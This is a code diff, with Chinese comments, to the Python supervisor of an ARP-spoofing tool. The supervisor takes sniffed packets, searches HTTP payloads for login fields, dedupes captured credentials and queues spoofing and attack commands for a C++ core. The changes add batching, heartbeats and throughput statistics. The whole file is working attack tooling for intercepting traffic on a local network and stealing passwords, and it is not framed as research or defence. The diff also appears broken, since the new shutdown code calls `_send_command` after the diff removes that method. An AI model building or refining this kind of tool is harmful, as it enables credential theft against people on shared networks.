@@ -19,6 +19,7 @@ import argparse
 import signal
 import sys
 import hashlib  # ★【新增】★ 用于计算数据包指纹
+import queue     # ★【新增】★ 用于批量命令处理
 from concurrent.futures import ThreadPoolExecutor
 from cachetools import TTLCache  # ★【新增】★ 用于去重缓存
 from dataclasses import dataclass
@@ -40,10 +41,18 @@ class PythonSupervisor:
         
         # ZMQ上下文和套接字
         self.context = zmq.Context()
+        # ★【新增】★ 独立的心跳ZMQ上下文，避免GIL争用
+        self.heartbeat_context = zmq.Context()
         self.packet_receiver = None
         self.command_sender = None
         self.heartbeat_receiver = None  # ★【新增】★ 心跳接收通道
         self.heartbeat_sender = None    # ★【新增】★ 心跳线程专用发送通道
+        self.heartbeat_sender_dedicated = None  # ★【新增】★ 独立心跳上下文的发送通道
+        
+        # ★【新增】★ 批量命令处理
+        self.command_queue = queue.Queue(maxsize=1000)
+        self.command_processor_thread = None
+        self.command_processor_running = False
         
         # 核心组件
         self.state_cache = StateCache()
@@ -56,31 +65,36 @@ class PythonSupervisor:
         self.heartbeat_thread = None
         self.heartbeat_running = False
         
-        # 线程池
+        # ★【优化】★ 线程池配置，限制最大线程数避免资源争用
+        max_threads = min(config.max_worker_threads, 8)  # 限制最大8个线程
         self.thread_pool = ThreadPoolExecutor(
-            max_workers=config.max_worker_threads,
+            max_workers=max_threads,
             thread_name_prefix="PacketWorker"
         )
         
-        # 统计信息
+        # ★【增强】★ 统计信息，添加更多监控指标
         self.stats = {
             'start_time': time.time(),
             'packets_received': 0,
             'packets_processed': 0,
+            'packets_dropped': 0,        # ★【新增】★ 丢包统计
             'commands_sent': 0,
+            'commands_queued': 0,        # ★【新增】★ 队列命令数
             'attacks_launched': 0,
-            'credentials_captured': 0
+            'credentials_captured': 0,
+            'heartbeat_sent': 0,         # ★【新增】★ 心跳发送统计
+            'heartbeat_received': 0,     # ★【新增】★ 心跳接收统计
+            'processing_rate': 0.0       # ★【新增】★ 处理速率
         }
+        self.stats_lock = threading.RLock()  # ★【优化】★ 使用可重入锁
         
-        # ★★★【新增】★★★ 入口去重缓存 
-        # 缓存最近500个数据包的哈希值，有效期3秒
-        # 这意味着3秒内到达的完全相同的数据包将被视为重复
-        # 这些值可以根据实际网络情况调整
-        self.recent_packets_cache = TTLCache(maxsize=500, ttl=3)
+        # ★★★【优化】★★★ 入口去重缓存，减少内存占用
+        # 缓存最近300个数据包的哈希值，有效期2秒（优化的配置）
+        self.recent_packets_cache = TTLCache(maxsize=300, ttl=2)
         self.cache_lock = threading.Lock()  # 用于保护缓存的线程安全
         
-        # ★【强化去重】★ HTTP凭据级别的去重缓存
-        self.http_credentials_cache = TTLCache(maxsize=200, ttl=10)  # HTTP凭据去重，10秒TTL
+        # ★【优化】★ HTTP凭据级别的去重缓存，减少大小
+        self.http_credentials_cache = TTLCache(maxsize=100, ttl=8)  # 减少到100，8秒TTL
         self.http_cache_lock = threading.Lock()
         
         # 设置日志
@@ -110,9 +124,13 @@ class PythonSupervisor:
                 return False
                 
             # 初始化各个组件
-            if not self.attack_coordinator.initialize(self._send_command):
+            # ★【修改】★ 使用队列命令而不是直接发送
+            if not self.attack_coordinator.initialize(self._queue_command):
                 self.logger.error("Failed to initialize attack coordinator")
                 return False
+            
+            # ★【新增】★ 启动命令处理线程
+            self._start_command_processor()
                 
             # 启动Web API（如果启用）
             if self.config.enable_web_api:
@@ -128,15 +146,18 @@ class PythonSupervisor:
     def _init_zmq(self) -> bool:
         """初始化ZMQ通信"""
         try:
+            # ★【优化】★ ZMQ缓冲区配置，提高性能
             # 接收数据包的套接字（PULL模式）
             self.packet_receiver = self.context.socket(zmq.PULL)
             self.packet_receiver.bind(self.config.packet_ipc_address)
-            self.packet_receiver.setsockopt(zmq.RCVTIMEO, 1000)  # 1秒超时
+            self.packet_receiver.setsockopt(zmq.RCVTIMEO, 500)  # ★【优化】★ 减少超时时间
+            self.packet_receiver.setsockopt(zmq.RCVHWM, 1000)  # ★【新增】★ 高水位标记
             
             # 发送命令的套接字（PUSH模式）
             self.command_sender = self.context.socket(zmq.PUSH)
             self.command_sender.bind(self.config.command_ipc_address)
-            self.command_sender.setsockopt(zmq.SNDTIMEO, 1000)  # 1秒超时
+            self.command_sender.setsockopt(zmq.SNDTIMEO, 500)  # ★【优化】★ 减少超时时间
+            self.command_sender.setsockopt(zmq.SNDHWM, 1000)  # ★【新增】★ 高水位标记
             
             # ★【新增】★ 接收心跳的套接字（PULL模式）
             self.heartbeat_receiver = self.context.socket(zmq.PULL)
@@ -147,6 +168,11 @@ class PythonSupervisor:
             self.heartbeat_sender = self.context.socket(zmq.PUSH)
             self.heartbeat_sender.connect(self.config.command_ipc_address)
             self.heartbeat_sender.setsockopt(zmq.SNDTIMEO, 500)  # 500ms超时，快速失败
+            
+            # ★【新增】★ 独立心跳上下文的专用发送通道
+            self.heartbeat_sender_dedicated = self.heartbeat_context.socket(zmq.PUSH)
+            self.heartbeat_sender_dedicated.connect(self.config.command_ipc_address)
+            self.heartbeat_sender_dedicated.setsockopt(zmq.SNDTIMEO, 200)  # ★【优化】★ 更短超时
             
             self.logger.info(f"ZMQ sockets initialized:")
             self.logger.info(f"  - Packet receiver: {self.config.packet_ipc_address}")
@@ -169,16 +195,29 @@ class PythonSupervisor:
         # ★【新增】★ 启动心跳机制
         self.start_heartbeat()
         
+        # ★【新增】★ 启动性能监控
+        self._start_performance_monitoring()
+        
         try:
             while self.running:
                 try:
                     # 1. 接收原始二进制数据
                     raw_data = self.packet_receiver.recv(zmq.NOBLOCK)
-                    self.stats['packets_received'] += 1
+                    with self.stats_lock:
+                        self.stats['packets_received'] += 1
                     
                     # ★★★【关键性能优化】★★★ 主线程只负责快速接收和分发
                     # 2. 最轻量的预检查 - 只检查数据长度
                     if len(raw_data) < 10:  # 过小的数据直接丢弃
+                        with self.stats_lock:
+                            self.stats['packets_dropped'] += 1
+                        continue
+                    
+                    # ★【负载控制】★ 检查队列深度，防止过载
+                    if self.command_queue.qsize() > 800:  # 过载阈值
+                        with self.stats_lock:
+                            self.stats['packets_dropped'] += 1
+                        self.logger.warning("System overloaded, dropping packet")
                         continue
                     
                     # 3. ★【性能关键】★ 直接提交到线程池，避免主线程阻塞
@@ -219,72 +258,291 @@ class PythonSupervisor:
         except Exception as e:
             self.logger.error(f"Error processing packet: {e}")
             
-    def _execute_decision(self, decision):
-        """执行攻击决策"""
+    # ★【新增】★ 批量命令处理方法
+    def _queue_command(self, command: dict):
+        """将命令加入队列进行批量处理"""
         try:
-            if decision.action == 'attack':
-                # ★【关键修复】★ 注册活跃攻击
-                if hasattr(self.attack_coordinator, 'register_active_attack'):
-                    if not self.attack_coordinator.register_active_attack(decision.target_ip, decision.duration):
-                        self.logger.warning(f"🚫 Attack on {decision.target_ip} rejected due to concurrency limits")
-                        return
+            # 负载控制：如果队列太满，丢弃新命令
+            if self.command_queue.full():
+                with self.stats_lock:
+                    self.stats['packets_dropped'] += 1
+                self.logger.warning("Command queue full, dropping command")
+                return
+            
+            self.command_queue.put(command, block=False)
+            with self.stats_lock:
+                self.stats['commands_queued'] += 1
                 
-                attack_log = f"Launching {decision.attack_type} attack on {decision.target_ip} for {decision.duration}s"
-                self.logger.info(attack_log)
+        except queue.Full:
+            with self.stats_lock:
+                self.stats['packets_dropped'] += 1
+            self.logger.warning("Command queue full, command dropped")
+            
+    def _start_command_processor(self):
+        """启动批量命令处理线程"""
+        self.command_processor_running = True
+        self.command_processor_thread = threading.Thread(
+            target=self._command_processor_loop, 
+            daemon=True,
+            name="CommandProcessor"
+        )
+        self.command_processor_thread.start()
+        self.logger.info("Command processor thread started")
+        
+    def _command_processor_loop(self):
+        """批量命令处理循环"""
+        self.logger.info("Command processor loop started")
+        batch_size = 5  # 批处理大小
+        batch_timeout = 0.1  # 100ms批处理超时
+        
+        while self.command_processor_running:
+            commands_batch = []
+            
+            try:
+                # 收集一批命令
+                start_time = time.time()
+                while (len(commands_batch) < batch_size and 
+                       time.time() - start_time < batch_timeout):
+                    try:
+                        command = self.command_queue.get(timeout=0.01)
+                        commands_batch.append(command)
+                    except queue.Empty:
+                        continue
+                
+                # 批量发送命令
+                if commands_batch:
+                    self._send_commands_batch(commands_batch)
+                    
+            except Exception as e:
+                self.logger.error(f"Error in command processor: {e}")
+                time.sleep(0.1)  # 发生错误时短暂休眠
+                
+        self.logger.info("Command processor loop stopped")
+        
+    def _send_commands_batch(self, commands: list):
+        """批量发送命令"""
+        try:
+            for command in commands:
+                command_json = json.dumps(command)
+                self.command_sender.send_string(command_json, zmq.NOBLOCK)
+                
+                with self.stats_lock:
+                    self.stats['commands_sent'] += 1
+                    
+        except zmq.Again:
+            self.logger.warning(f"Batch command send timeout, {len(commands)} commands failed")
+            with self.stats_lock:
+                self.stats['packets_dropped'] += len(commands)
+        except Exception as e:
+            self.logger.error(f"Error sending command batch: {e}")
+            with self.stats_lock:
+                self.stats['packets_dropped'] += len(commands)
+    
+    # ★【优化】★ 独立心跳处理方法
+    def _handle_ping(self, ping_data):
+        """处理心跳PING，使用独立通道发送PONG"""
+        try:
+            pong_response = {
+                "type": "pong",
+                "timestamp": time.time(),
+                "supervisor_id": "python_supervisor"
+            }
+            
+            # ★【关键修复】★ 使用独立心跳发送通道，避免主通道阻塞
+            pong_json = json.dumps(pong_response)
+            self.heartbeat_sender_dedicated.send_string(pong_json, zmq.NOBLOCK)
+            
+            with self.stats_lock:
+                self.stats['heartbeat_sent'] += 1
+                
+            # ★【优化】★ 降低心跳日志频率，避免日志洪泛
+            current_time = time.time()
+            if not hasattr(self, '_last_heartbeat_log') or current_time - self._last_heartbeat_log > 30:
+                self.logger.debug("🫀 PONG sent via dedicated channel")
+                self._last_heartbeat_log = current_time
+                
+        except zmq.Again:
+            self.logger.warning("Heartbeat PONG send timeout via dedicated channel")
+        except Exception as e:
+            self.logger.error(f"Error sending heartbeat PONG: {e}")
+    
+    # ★【增强】★ 性能监控方法
+    def _start_performance_monitoring(self):
+        """启动性能监控"""
+        self.performance_monitoring_thread = threading.Thread(
+            target=self._performance_monitoring_loop,
+            daemon=True,
+            name="PerformanceMonitor"
+        )
+        self.performance_monitoring_thread.start()
+        self.logger.info("Performance monitoring started")
+        
+    def _performance_monitoring_loop(self):
+        """性能监控循环"""
+        last_stats_time = time.time()
+        last_packets = 0
+        last_commands = 0
+        
+        while self.running:
+            try:
+                current_time = time.time()
+                
+                # 每30秒输出一次性能报告
+                if current_time - last_stats_time >= 30:
+                    with self.stats_lock:
+                        current_packets = self.stats['packets_processed']
+                        current_commands = self.stats['commands_sent']
+                        
+                        # 计算处理速率
+                        time_diff = current_time - last_stats_time
+                        packet_rate = (current_packets - last_packets) / time_diff
+                        command_rate = (current_commands - last_commands) / time_diff
+                        
+                        self.stats['processing_rate'] = packet_rate
+                        
+                        # 输出性能报告
+                        uptime = current_time - self.stats['start_time']
+                        self.logger.info(f"📊 Performance Report:")
+                        self.logger.info(f"  Uptime: {uptime:.1f}s")
+                        self.logger.info(f"  Packets: {current_packets} (rate: {packet_rate:.1f}/s)")
+                        self.logger.info(f"  Commands: {current_commands} (rate: {command_rate:.1f}/s)")
+                        self.logger.info(f"  Queue size: {self.command_queue.qsize()}")
+                        self.logger.info(f"  Drops: {self.stats['packets_dropped']}")
+                        self.logger.info(f"  Heartbeat: sent={self.stats['heartbeat_sent']}, received={self.stats['heartbeat_received']}")
+                        
+                        # ★【新增】★ 显示Scout和Attack会话统计
+                        if hasattr(self.attack_coordinator, 'get_session_stats'):
+                            session_stats = self.attack_coordinator.get_session_stats()
+                            self.logger.info(f"  Sessions: Scout {session_stats['active_scouts']}/{session_stats['max_scout_attacks']}, Attack {session_stats['active_attacks']}/{session_stats['max_active_attacks']}")
+                        
+                        # 更新统计
+                        last_packets = current_packets
+                        last_commands = current_commands
+                        last_stats_time = current_time
+                        
+                        # 性能警告
+                        if self.command_queue.qsize() > 800:
+                            self.logger.warning("⚠️  High command queue depth detected!")
+                        if packet_rate > 500:
+                            self.logger.warning("⚠️  High packet processing rate!")
+                
+                time.sleep(5)  # 每5秒检查一次
+                
+            except Exception as e:
+                self.logger.error(f"Error in performance monitoring: {e}")
+                time.sleep(5)
+    
+    # ★【新增】★ 优化的执行决策方法
+    def _execute_decision(self, decision):
+        """执行攻击决策 - 使用队列而不是直接发送"""
+        try:
+            command = {
+                "type": decision["action"],
+                "target_ip": decision["target_ip"],
+                "gateway_ip": decision.get("gateway_ip", "10.17.0.1"),
+                "target_mac": decision.get("target_mac", ""),
+                "gateway_mac": decision.get("gateway_mac", ""),
+                "duration": decision.get("duration", 60),
+                "attack_type": decision.get("attack_type", "scouting")
+            }
+            
+            # ★【关键修改】★ 使用队列而不是直接发送
+            self._queue_command(command)
+            
+            with self.stats_lock:
                 self.stats['attacks_launched'] += 1
-                
-                # 发送攻击命令给C++核心
-                command = {
-                    'type': 'START_SPOOF',
-                    'target_ip': decision.target_ip,
-                    'gateway_ip': decision.gateway_ip,
-                    'target_mac': decision.target_mac,
-                    'gateway_mac': decision.gateway_mac,
-                    'duration': decision.duration,
-                    'attack_type': decision.attack_type,  # ★【新增】★ 攻击类型
-                    'reason': decision.reason
-                }
-                
-                self._send_command(command)
-                
-            elif decision.action == 'restore':
-                self.logger.info(f"Restoring ARP for {decision.target_ip}")
-                
-                command = {
-                    'type': 'RESTORE_ARP',
-                    'target_ip': decision.target_ip,
-                    'gateway_ip': decision.gateway_ip,
-                    'target_mac': decision.target_mac,
-                    'gateway_mac': decision.gateway_mac
-                }
-                
-                self._send_command(command)
                 
         except Exception as e:
             self.logger.error(f"Error executing decision: {e}")
-            
-    def _send_command(self, command: dict):
-        """发送命令给C++核心"""
+    
+    # ★【新增】★ 程序结束时打印最终统计
+    def _print_final_stats(self):
+        """打印最终统计信息"""
+        uptime = time.time() - self.stats['start_time']
+        
+        print("\n" + "="*50)
+        print("📋 Final Statistics Summary")
+        print("="*50)
+        print(f"Total uptime: {uptime:.1f} seconds")
+        print(f"Packets received: {self.stats['packets_received']}")
+        print(f"Packets processed: {self.stats['packets_processed']}")
+        print(f"Packets dropped: {self.stats['packets_dropped']}")
+        print(f"Commands sent: {self.stats['commands_sent']}")
+        print(f"Commands queued: {self.stats['commands_queued']}")
+        print(f"Attacks launched: {self.stats['attacks_launched']}")
+        print(f"Credentials captured: {self.stats['credentials_captured']}")
+        print(f"Heartbeats sent: {self.stats['heartbeat_sent']}")
+        print(f"Heartbeats received: {self.stats['heartbeat_received']}")
+        
+        if uptime > 0:
+            print(f"Average packet rate: {self.stats['packets_processed']/uptime:.1f} packets/sec")
+            print(f"Average command rate: {self.stats['commands_sent']/uptime:.1f} commands/sec")
+        
+        # 计算效率指标
+        total_packets = self.stats['packets_processed'] + self.stats['packets_dropped']
+        if total_packets > 0:
+            drop_rate = (self.stats['packets_dropped'] / total_packets) * 100
+            print(f"Packet drop rate: {drop_rate:.2f}%")
+        
+        if self.stats['heartbeat_sent'] > 0:
+            heartbeat_success_rate = (self.stats['heartbeat_received'] / self.stats['heartbeat_sent']) * 100
+            print(f"Heartbeat success rate: {heartbeat_success_rate:.2f}%")
+        
+        print("="*50)
+    
+    # ★【修改】★ 优化的关闭处理
+    def shutdown(self):
+        """优雅关闭监督者"""
+        self.logger.info("🛑 Starting supervisor shutdown sequence...")
+        
+        # 发送关闭信号给C++核心
         try:
-            command_json = json.dumps(command)
-            self.command_sender.send_string(command_json, zmq.NOBLOCK)
-            self.stats['commands_sent'] += 1
-            
-        except zmq.Again:
-            self.logger.warning("Command send timeout")
+            shutdown_cmd = {"type": "shutdown"}
+            self._send_command(shutdown_cmd)
+            self.logger.info("📤 Shutdown signal sent to C++ core")
         except Exception as e:
-            self.logger.error(f"Error sending command: {e}")
-            
-    # ★【新增】★ 心跳机制方法
+            self.logger.error(f"Failed to send shutdown command: {e}")
+        
+        self.running = False
+        
+        # ★【新增】★ 停止命令处理线程
+        if hasattr(self, 'command_processor_running'):
+            self.command_processor_running = False
+            if hasattr(self, 'command_processor_thread') and self.command_processor_thread:
+                self.command_processor_thread.join(timeout=2.0)
+                self.logger.info("Command processor thread stopped")
+        
+        # 停止心跳
+        self.stop_heartbeat()
+        
+        # 停止Web API
+        if self.config.enable_web_api:
+            self.web_api.stop()
+        
+        # 关闭线程池
+        self.thread_pool.shutdown(wait=True)
+        
+        # ★【新增】★ 清理独立心跳上下文
+        if hasattr(self, 'heartbeat_context'):
+            self.heartbeat_context.term()
+        
+        # 关闭ZMQ上下文
+        self.context.term()
+        
+        # ★【新增】★ 打印最终统计
+        self._print_final_stats()
+        
+        self.logger.info("✅ Supervisor shutdown complete")
+
     def start_heartbeat(self):
         """启动心跳监听线程"""
         if self.heartbeat_running:
             return
             
         self.heartbeat_running = True
-        self.heartbeat_thread = threading.Thread(target=self._heartbeat_loop, daemon=True)
+        self.heartbeat_thread = threading.Thread(target=self._heartbeat_loop, daemon=True, name="HeartbeatLoop")
         self.heartbeat_thread.start()
-        self.logger.info("Heartbeat mechanism started")
+        self.logger.info("🫀 Heartbeat loop started, waiting for PING from C++ core...")
     
     def stop_heartbeat(self):
         """停止心跳机制"""
@@ -294,273 +552,28 @@ class PythonSupervisor:
         self.logger.info("Heartbeat mechanism stopped")
     
     def _heartbeat_loop(self):
-        """心跳监听循环 - 使用专用心跳通道"""
-        self.logger.info("🫀 Heartbeat loop started, waiting for PING from C++ core...")
-        
-        while self.heartbeat_running and self.running:
+        """心跳监听循环"""
+        while self.heartbeat_running:
             try:
-                # ★【新增】★ 从专用心跳通道接收PING消息
-                try:
-                    raw_data = self.heartbeat_receiver.recv(zmq.NOBLOCK)
-                    heartbeat_data = raw_data.decode('utf-8')
-                    ping_info = json.loads(heartbeat_data)
+                # 接收心跳PING
+                message = self.heartbeat_receiver.recv_string(zmq.NOBLOCK)
+                ping_data = json.loads(message)
+                
+                if ping_data.get("type") == "ping":
+                    with self.stats_lock:
+                        self.stats['heartbeat_received'] += 1
+                    self._handle_ping(ping_data)
                     
-                    if ping_info.get('type') == 'PING':
-                        self.logger.info(f"🫀 Received PING: {ping_info}")  # ★【提升为INFO级别】★
-                        self._handle_ping(ping_info)
-                    else:
-                        self.logger.warning(f"🫀 Unexpected heartbeat message: {ping_info}")
-                        
-                except zmq.Again:
-                    # 没有心跳数据，继续下一次循环
-                    pass
-                except (UnicodeDecodeError, json.JSONDecodeError) as e:
-                    self.logger.warning(f"Invalid heartbeat data: {e}")
-                
-                # 检查连接状态
-                current_time = time.time()
-                if current_time - self.last_ping_time > 20:  # 20秒没收到ping
-                    self.logger.warning("⚠️  No heartbeat from C++ core for 20+ seconds")
-                
-                time.sleep(0.1)  # ★【优化】★ 减少休眠时间，提高响应性
-                
-            except Exception as e:
-                self.logger.error(f"Heartbeat loop error: {e}")
-                time.sleep(1)
-    
-    def _handle_ping(self, ping_data):
-        """处理心跳PING并回复PONG - 使用独立的心跳发送通道"""
-        try:
-            self.last_ping_time = time.time()
-            self.logger.info(f"🫀 Processing PING, sending PONG response...")  # ★【提升为INFO级别】★
-            
-            # 构造PONG响应
-            pong_command = {
-                'type': 'PONG',
-                'timestamp': int(time.time() * 1000),  # 毫秒时间戳
-                'status': 'healthy'
-            }
-            
-            # ★【关键修复】★ 使用心跳线程专用的socket发送PONG，避免主线程阻塞
-            try:
-                pong_json = json.dumps(pong_command)
-                self.heartbeat_sender.send_string(pong_json, zmq.NOBLOCK)
-                self.logger.info(f"🫀 PONG sent successfully via dedicated heartbeat channel")
             except zmq.Again:
-                self.logger.warning(f"🫀 PONG send timeout - heartbeat channel busy")
-            except Exception as send_error:
-                self.logger.error(f"🫀 Failed to send PONG via heartbeat channel: {send_error}")
-            
-        except Exception as e:
-            self.logger.error(f"Failed to handle ping: {e}")
-            
-    def _shutdown(self):
-        """清理资源 - 强化版本"""
-        self.logger.info("🛑 Starting supervisor shutdown sequence...")
-        self.running = False
-        
-        # ★【新增】★ 发送关闭信号给C++核心
-        try:
-            shutdown_command = {
-                'type': 'SHUTDOWN',
-                'timestamp': int(time.time() * 1000),
-                'reason': 'supervisor_shutdown'
-            }
-            self._send_command(shutdown_command)
-            self.logger.info("📤 Shutdown signal sent to C++ core")
-            time.sleep(0.5)  # 给C++时间处理关闭信号
-        except Exception as e:
-            self.logger.warning(f"Failed to send shutdown signal: {e}")
-        
-        # 停止心跳线程
-        if hasattr(self, 'heartbeat_thread') and self.heartbeat_thread:
-            self.heartbeat_running = False
-            try:
-                self.heartbeat_thread.join(timeout=2.0)
-                self.logger.info("❤️ Heartbeat thread stopped")
+                # 没有心跳消息，继续等待
+                time.sleep(0.1)
+                continue
             except Exception as e:
-                self.logger.warning(f"Heartbeat thread cleanup error: {e}")
+                self.logger.error(f"Error in heartbeat loop: {e}")
+                time.sleep(0.1)
         
-        # 停止线程池 - 兼容不同Python版本
-        if self.thread_pool:
-            self.logger.info("🧵 Shutting down thread pool...")
-            try:
-                # Python 3.9+ 支持timeout参数
-                self.thread_pool.shutdown(wait=True, timeout=5.0)
-                self.logger.info("🧵 Thread pool shutdown complete")
-            except TypeError:
-                # Python 3.8及以下版本
-                self.thread_pool.shutdown(wait=True)
-                self.logger.info("🧵 Thread pool shutdown complete (legacy)")
-            except Exception as e:
-                self.logger.error(f"Thread pool shutdown error: {e}")
-            
-        # 停止Web API
-        if self.config.enable_web_api:
-            try:
-                self.web_api.stop()
-                self.logger.info("🌐 Web API stopped")
-            except Exception as e:
-                self.logger.warning(f"Web API stop error: {e}")
-            
-        # ★【新增】★ 清理缓存
-        try:
-            with self.cache_lock:
-                if hasattr(self, 'recent_packets_cache'):
-                    self.recent_packets_cache.clear()
-            with self.http_cache_lock:
-                if hasattr(self, 'http_credentials_cache'):
-                    self.http_credentials_cache.clear()
-            self.logger.info("🧹 Caches cleared")
-        except Exception as e:
-            self.logger.warning(f"Cache cleanup error: {e}")
-            
-        # 关闭ZMQ套接字
-        try:
-            if self.packet_receiver:
-                self.packet_receiver.close()
-                self.logger.info("📥 Packet receiver socket closed")
-            if self.command_sender:
-                self.command_sender.close()
-                self.logger.info("📤 Command sender socket closed")
-            if self.heartbeat_receiver:  # ★【新增】★ 关闭心跳接收器
-                self.heartbeat_receiver.close()
-                self.logger.info("❤️ Heartbeat receiver socket closed")
-            if self.heartbeat_sender:    # ★【新增】★ 关闭心跳发送器
-                self.heartbeat_sender.close()
-                self.logger.info("❤️ Heartbeat sender socket closed")
-        except Exception as e:
-            self.logger.warning(f"ZMQ socket cleanup error: {e}")
-            
-        # 销毁ZMQ上下文
-        try:
-            self.context.term()
-            self.logger.info("🔌 ZMQ context terminated")
-        except Exception as e:
-            self.logger.warning(f"ZMQ context cleanup error: {e}")
+        self.logger.info("Heartbeat loop stopped")
         
-        # 打印统计信息
-        self._print_final_stats()
-    
-    def _is_packet_worth_processing(self, packet_info: dict) -> bool:
-        """快速预过滤：判断数据包是否值得进一步处理"""
-        try:
-            packet_type = packet_info.get('type')
-            
-            # 过滤未知类型的包
-            if packet_type not in [1, 2]:  # 1=ARP, 2=HTTP
-                return False
-            
-            # 对于ARP包，快速检查源IP是否有效
-            if packet_type == 1:
-                src_ip = packet_info.get('src_ip', '')
-                if not src_ip or src_ip in {'0.0.0.0', '255.255.255.255', '127.0.0.1'}:
-                    return False
-                
-                # 检查是否为ARP请求
-                if packet_info.get('arp_opcode', 0) != 1:
-                    return False
-            
-            # 对于HTTP包，快速检查是否可能包含凭据
-            elif packet_type == 2:
-                src_ip = packet_info.get('src_ip', '')
-                if not src_ip or src_ip in {'0.0.0.0', '255.255.255.255', '127.0.0.1'}:
-                    return False
-                
-                # 快速检查端口是否为高价值端口
-                dst_port = packet_info.get('dst_port', 0)
-                if dst_port not in self.config.network.high_value_ports:
-                    # 对于非高价值端口，检查是否可能包含凭据
-                    if not self._has_potential_credentials(packet_info):
-                        return False
-            
-            return True
-            
-        except Exception as e:
-            self.logger.debug(f"Pre-filter error: {e}")
-            return True  # 出错时保守处理，允许通过
-    
-    def _has_potential_credentials(self, packet_info: dict) -> bool:
-        """快速检查HTTP包是否可能包含凭据（避免深度正则表达式分析）"""
-        try:
-            payload = packet_info.get('payload', '').lower()
-            
-            # 快速字符串搜索，避免复杂正则
-            credential_indicators = [
-                'username=', 'password=', 'user=', 'pwd=', 'pass=',
-                'login=', 'account=', 'user_account=', 'user_password=',
-                '"username":', '"password":', 'loginname=', 'passwd='
-            ]
-            
-            return any(indicator in payload for indicator in credential_indicators)
-            
-        except Exception:
-            return True  # 出错时保守处理
-    
-    def _process_packet_with_dedup(self, raw_data: bytes):
-        """★【新增】★ 工作线程中的完整数据包处理（包含去重）"""
-        try:
-            # 1. JSON解析（在工作线程中进行）
-            try:
-                packet_data = raw_data.decode('utf-8')
-                packet_info = json.loads(packet_data)
-            except (UnicodeDecodeError, json.JSONDecodeError):
-                return  # 无效数据，直接丢弃
-            
-            # 2. 预过滤检查
-            if not self._is_packet_worth_processing(packet_info):
-                return
-            
-            # 3. 去重检查（在工作线程中进行）
-            payload_hash = hashlib.sha1(raw_data).hexdigest()
-            
-            with self.cache_lock:
-                if hasattr(self, 'recent_packets_cache') and self.recent_packets_cache is not None:
-                    if payload_hash in self.recent_packets_cache:
-                        return  # 重复包，丢弃
-                    else:
-                        self.recent_packets_cache[payload_hash] = True
-                else:
-                    # 容错：初始化缓存
-                    try:
-                        from cachetools import TTLCache
-                        self.recent_packets_cache = TTLCache(maxsize=500, ttl=3)
-                        self.recent_packets_cache[payload_hash] = True
-                        self.logger.warning("🔧 Re-initialized packet deduplication cache")
-                    except ImportError:
-                        self.recent_packets_cache = {}
-                        self.recent_packets_cache[payload_hash] = True
-                        self.logger.warning("🔧 Using simple dict for packet deduplication")
-            
-            # 4. HTTP凭据去重
-            if packet_info.get('type') == 2 and self._has_potential_credentials(packet_info):
-                src_ip = packet_info.get('src_ip', '')
-                payload = packet_info.get('payload', '')
-                
-                cred_fingerprint = f"{src_ip}:{hashlib.md5(payload.encode()).hexdigest()[:8]}"
-                
-                with self.http_cache_lock:
-                    if hasattr(self, 'http_credentials_cache') and self.http_credentials_cache is not None:
-                        if cred_fingerprint in self.http_credentials_cache:
-                            return  # 重复凭据包，丢弃
-                        else:
-                            self.http_credentials_cache[cred_fingerprint] = True
-                    else:
-                        # 容错：初始化HTTP凭据缓存
-                        try:
-                            from cachetools import TTLCache
-                            self.http_credentials_cache = TTLCache(maxsize=200, ttl=10)
-                            self.http_credentials_cache[cred_fingerprint] = True
-                        except ImportError:
-                            self.http_credentials_cache = {}
-                            self.http_credentials_cache[cred_fingerprint] = True
-            
-            # 5. 进行实际的数据包处理
-            self._process_packet(packet_data)
-            
-        except Exception as e:
-            self.logger.error(f"Error in async packet processing: {e}")
-
 def parse_arguments():
     """解析命令行参数"""
     parser = argparse.ArgumentParser(description="ARP Spoofer Python Supervisor")
